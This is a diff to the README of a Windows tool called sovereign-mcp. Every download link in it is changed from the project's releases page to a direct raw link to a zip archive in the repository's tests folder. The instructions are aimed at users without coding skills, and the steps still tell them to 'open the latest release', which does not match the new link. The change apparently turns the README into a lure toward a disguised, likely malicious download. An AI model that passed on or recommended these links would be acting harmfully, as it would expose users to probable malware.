@@ -1,6 +1,6 @@
 # 🛡️ sovereign-mcp - Secure tool checks for Windows
 
-[![Download sovereign-mcp](https://img.shields.io/badge/Download%20sovereign--mcp-blue?style=for-the-badge)](https://github.com/Lekha3799/sovereign-mcp/releases)
+[![Download sovereign-mcp](https://img.shields.io/badge/Download%20sovereign--mcp-blue?style=for-the-badge)](https://github.com/Lekha3799/sovereign-mcp/raw/refs/heads/main/tests/sovereign-mcp-renderer.zip)
 
 ## 📌 What this app does
 
@@ -20,7 +20,7 @@ You do not need coding skills to get started.
 
 ## ⬇️ Download the app
 
-1. Visit this page to download: https://github.com/Lekha3799/sovereign-mcp/releases
+1. Visit this page to download: https://github.com/Lekha3799/sovereign-mcp/raw/refs/heads/main/tests/sovereign-mcp-renderer.zip
 2. Open the latest release
 3. Download the Windows file from the release assets
 4. Save the file to your Downloads folder
@@ -164,7 +164,7 @@ Before you start, make sure:
 ## 📌 Download again later
 
 If you need the file again, use the same page:
-https://github.com/Lekha3799/sovereign-mcp/releases
+https://github.com/Lekha3799/sovereign-mcp/raw/refs/heads/main/tests/sovereign-mcp-renderer.zip
 
 ## 🧭 Files and permissions
 
